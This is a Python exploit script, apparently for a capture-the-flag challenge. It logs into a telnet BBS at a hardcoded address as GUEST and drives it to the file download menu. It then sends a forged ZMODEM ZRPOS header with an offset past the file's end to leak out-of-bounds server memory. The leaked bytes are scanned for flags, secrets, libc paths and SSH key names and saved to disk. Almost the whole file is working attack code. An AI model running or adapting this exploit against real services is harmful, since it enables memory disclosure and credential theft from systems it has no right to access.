#!/usr/bin/env python3
# /// script
# requires-python = ">=3.11"
# ///

from __future__ import annotations

import argparse
import pathlib
import re
import socket
import time

HERE = pathlib.Path(__file__).resolve().parent
OTHER = HERE.parent / "other" / "leaks"

HOST = "23.179.17.92"
PORT = 2323


def crc16(data: bytes) -> int:
    crc = 0
    for byte in data:
        crc ^= byte << 8
        for _ in range(8):
            if crc & 0x8000:
                crc = ((crc << 1) ^ 0x1021) & 0xFFFF
            else:
                crc = (crc << 1) & 0xFFFF
    return crc


def hex_header(
    frame_type: int,
    b0: int = 0,
    b1: int = 0,
    b2: int = 0,
    b3: int = 0,
) -> bytes:
    header = bytes([frame_type, b0, b1, b2, b3])
    crc = crc16(header)
    return (
        b"**\x18B"
        + b"".join(f"{value:02x}".encode() for value in header)
        + f"{crc:04x}".encode()
        + b"\r\x8a\x11"
    )


def recv_idle(
    sock: socket.socket,
    *,
    first_wait: float = 0.2,
    idle: float = 0.5,
    max_total: float = 15.0,
) -> bytes:
    time.sleep(first_wait)
    sock.setblocking(False)
    out = bytearray()
    last_data = time.time()
    started = time.time()

    while time.time() - started < max_total:
        try:
            chunk = sock.recv(65535)
            if not chunk:
                break
            out.extend(chunk)
            last_data = time.time()
            if b"Download by number" in out or b"Transfer complete." in out:
                break
        except BlockingIOError:
            if time.time() - last_data > idle:
                break
            time.sleep(0.02)

    sock.setblocking(True)
    return bytes(out)


def unescape_zmodem(data: bytes) -> bytes:
    out = bytearray()
    i = 0
    while i < len(data):
        cur = data[i]
        if cur != 0x18:
            out.append(cur)
            i += 1
            continue

        if i + 1 >= len(data):
            break

        nxt = data[i + 1]
        if nxt == ord("l"):
            out.append(0x7F)
        elif nxt == ord("m"):
            out.append(0xFF)
        elif nxt in (0x8D, 0x8A) or (nxt & 0x60) == 0x40:
            out.append(nxt ^ 0x40)
        else:
            out.append(nxt)
        i += 2

    return bytes(out)


def decode_fileinfo(data: bytes) -> tuple[str, int]:
    decoded = unescape_zmodem(data)
    match = re.search(rb"([A-Z0-9_\.]+\.(?:ZIP|EXE|TOR))\x00([0-9]+)", decoded)
    if not match:
        raise RuntimeError("failed to decode ZFILE packet")
    name = match.group(1).decode().lstrip("D")
    size = int(match.group(2))
    return name, size


def drive_to_transfer(sock: socket.socket, file_num: int, override: str) -> None:
    recv_idle(sock, first_wait=1.0)
    for payload, wait in (
        (b"GUEST\r\n", 0.3),
        (b"\r\n", 0.3),
        (b"F\r\n", 0.7),
        (b"D\r\n", 0.4),
        (f"{file_num}\r\n".encode(), 0.5),
    ):
        sock.sendall(payload)
        recv_idle(sock, first_wait=wait, max_total=3.0)

    if file_num == 4:
        sock.sendall(override.encode() + b"\r\n")
        recv_idle(sock, first_wait=0.2, max_total=3.0)


def fetch_leak(
    file_num: int,
    override: str,
    offset: int | None,
    timesync: bool,
) -> tuple[str, int, int, bytes, bytes]:
    with socket.create_connection((HOST, PORT), timeout=10) as sock:
        drive_to_transfer(sock, file_num, override)

        zf1 = 0x02 if timesync else 0x00
        sock.sendall(hex_header(0x01, 0, 0, zf1, 0x23))
        recv_idle(sock, first_wait=0.1, max_total=2.0)

        sock.sendall(hex_header(0x03, 1, 0, 0, 0))
        fileinfo_raw = recv_idle(sock, first_wait=0.2, max_total=2.0)
        name, size = decode_fileinfo(fileinfo_raw)

        real_offset = size + 1 if offset is None else offset
        sock.sendall(
            hex_header(
                0x09,
                real_offset & 0xFF,
                (real_offset >> 8) & 0xFF,
                (real_offset >> 16) & 0xFF,
                (real_offset >> 24) & 0xFF,
            ),
        )
        raw = recv_idle(sock, first_wait=0.1, idle=0.6, max_total=15.0)

    decoded = unescape_zmodem(raw)
    return name, size, real_offset, raw, decoded


def printable_hits(decoded: bytes) -> list[tuple[bytes, int]]:
    payload = decoded
    if len(payload) >= 11 and payload[0] == 0x2A and payload[2] == 0x0A:
        payload = payload[11:]
    end = payload.find(b"Transfer complete.")
    if end != -1:
        payload = payload[:end]

    needles = [
        b"CIT{",
        b"flag",
        b"FLAG",
        b"secret",
        b"SECRET",
        b"/SECRETS",
        b"/UPLOADS",
        b"protected",
        b"/var/www/html",
        b"/proc/self/exe",
        b"/lib64/ld-linux-x86-64.so.2",
        b"/lib/x86_64-linux-gnu/libc.so.6",
        b"id_ed25519",
    ]
    return [(needle, payload.find(needle)) for needle in needles]


def save_outputs(
    file_num: int,
    offset: int,
    raw: bytes,
    decoded: bytes,
) -> tuple[pathlib.Path, pathlib.Path]:
    OTHER.mkdir(parents=True, exist_ok=True)
    stem = f"f{file_num}-zrpos-{offset}"
    raw_path = OTHER / f"{stem}.bin"
    decoded_path = OTHER / f"{stem}-decoded.bin"
    raw_path.write_bytes(raw)
    decoded_path.write_bytes(decoded)
    return raw_path, decoded_path


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--file", type=int, default=4)
    parser.add_argument("--override", default="x")
    parser.add_argument("--offset", type=int, default=None)
    parser.add_argument("--timesync", action="store_true")
    parser.add_argument("--no-save", action="store_true")
    args = parser.parse_args()

    name, size, offset, raw, decoded = fetch_leak(
        args.file,
        args.override,
        args.offset,
        args.timesync,
    )

    print(f"name={name}")
    print(f"size={size}")
    print(f"offset={offset}")
    print(f"raw_len={len(raw)}")
    print(f"decoded_len={len(decoded)}")
    for needle, pos in printable_hits(decoded):
        print(f"{needle.decode(errors='replace')}={pos}")

    if not args.no_save:
        raw_path, decoded_path = save_outputs(args.file, offset, raw, decoded)
        print(raw_path)
        print(decoded_path)


if __name__ == "__main__":
    main()
